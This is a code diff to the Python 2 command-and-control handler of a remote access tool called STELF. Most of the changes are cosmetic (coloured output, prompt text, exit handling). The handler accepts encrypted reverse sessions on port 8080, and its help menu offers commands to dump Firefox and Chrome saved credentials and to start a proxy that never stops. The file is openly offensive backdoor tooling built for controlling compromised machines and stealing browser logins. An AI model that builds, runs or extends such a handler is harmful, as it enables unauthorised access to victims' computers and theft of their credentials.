@@ -1,9 +1,29 @@
 #!/usr/bin/env python2
 # -*- coding: utf-8 -*-
 # from __future__ import unicode_literals
-import socket, sys, json, base64, random, hashlib, signal, threading, time, zlib, Queue, select
+import socket, sys, json, base64, random, hashlib, signal, threading, time, zlib, Queue, select, os
 from Crypto.Cipher import AES
+from colorama import init, Fore, Style
 import readline
+
+init(autoreset=True)
+
+import __builtin__ 
+
+def raw_input2(prompt=''): 
+	try: 
+		return raw_input1(prompt) 
+	except EOFError as exc: 
+		time.sleep(0.05) 
+		raise 
+
+raw_input1 = raw_input 
+__builtin__.raw_input = raw_input2 
+
+
+INFO = Style.BRIGHT + Fore.BLUE + "\n[*] "
+BAD = Style.BRIGHT + Fore.RED + "\n[-] "
+GOOD = Style.BRIGHT + Fore.GREEN + "\n[+] "
 
 class StoppableThread(threading.Thread):
 	def __init__(self, target):
@@ -30,8 +50,8 @@ class Client:
 		
 		self.aes_obj = AES.new(self.enc_key, AES.MODE_CFB, self.enc_IV)
 		
-		self.cwd = "STELF Connected "
-		self.prompt = self.cwd + ">>"
+		self.cwd = GOOD + "Starting interaction with "+str(self.id)+" "
+		self.prompt = self.cwd + ">> "
 		
 		self.threads = []
 		
@@ -144,8 +164,6 @@ class Client:
 			t.stop()
 		
 	def interact(self):
-		print "starting interaction"
-
 		readline.parse_and_bind("tab: complete")
 		readline.set_completer(self.tab_completer)
 		
@@ -153,16 +171,16 @@ class Client:
 			try:
 				user_input = raw_input(u"\n" + unicode(self.prompt, errors='ignore') + " ")
 			except KeyboardInterrupt:
-			    print ""
+			    print INFO + "User requested exit."
 			    break
 			if user_input == "help":
-				print "Available commands:"
+				print INFO + "Available commands:"
 				print " - prompt - Modify the prompt aesthetics,"
 				print " - crash - Crash the shell like Ayrton Senna,"
 				print " - test - Test the connection like a baws,"
-                                print " - proxy - Start the always running proxy WARNING: Does not stop! Ever!"
-                                print " - dumpff - Dump Firefox Credientials,"
-                                print " - dumpchrome - Dump Chrome Credientials."
+				print " - proxy - Start the always running proxy WARNING: Does not stop! Ever!"
+				print " - dumpff - Dump Firefox Credientials,"
+				print " - dumpchrome - Dump Chrome Credientials."
 			else:
 				try:
 					if not user_input: continue
@@ -184,7 +202,7 @@ class Client:
 					sys.stdout.write(data_package["data"])
 				
 				except Exception as e:
-						print e
+						print BAD + str(e)
 						del handler.clients[self.id]
 						break
 		
@@ -194,9 +212,7 @@ class Handler:
 	def __init__(self, bind, port):
 		self.bind = bind
 		self.port = port
-				
-		self.cwd = "STELF Connected "
-		self.prompt = self.cwd + ">>"
+
 		self.server_sock = socket.socket()
 		self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 		self.interacting = False
@@ -243,21 +259,23 @@ class Handler:
 			
 			if not self.interacting:
 				sys.stdout.write('\r'+' '*(len(readline.get_line_buffer())+2)+'\r')
-				print "[*] STELF session "+str(c.id)+" opened ("+c.address+":"+str(c.port)+" -> "+self.bind+":"+str(self.port)+")\n"
-				sys.stdout.write('handler>> ' + readline.get_line_buffer())
+				print INFO + "STELF session "+str(c.id)+" opened ("+c.address+":"+str(c.port)+" -> "+self.bind+":"+str(self.port)+")\n"
+				sys.stdout.write(Style.BRIGHT + Fore.RED + "handler" + Style.RESET_ALL + ">> " + readline.get_line_buffer())
 				sys.stdout.flush()
 			
 	def start(self):
-		print "[*] STELF HAS STARTED BABY"
+		print INFO + "STELF HAS STARTED BABY"
 		t = threading.Thread(target=self.accept_clients)
 		t.daemon = True
 		t.start()
 		while True:
 			try:
-				user_input = raw_input(u"handler>> ")
-			except KeyboardInterrupt: sys.exit("\n[*] User requested shutdown.")
+				user_input = raw_input(Style.BRIGHT + Fore.RED + "handler" + Style.RESET_ALL + ">> ")
+			except KeyboardInterrupt:
+				print INFO + "User requested shutdown."
+				os._exit(0)
 			if user_input == "list" or user_input == "l":
-				print "Current active sessions:"
+				print INFO + "Current active sessions:"
 				print "========================"
 				for c in self.clients:
 					print "["+str(c.id)+"]: " + c.address + ":" + str(c.port)
@@ -272,10 +290,11 @@ class Handler:
 					self.interacting = False
 				except Exception as e:
 					self.interacting = False
-					print e
+					print BAD + str(e)
 					
 			elif user_input == "exit":
-				sys.exit("\n[*] User requested shutdown.")
+				print INFO + "User requested shutdown."
+				os._exit(0)
 							
 handler = Handler("0.0.0.0", 8080)
 handler.start()
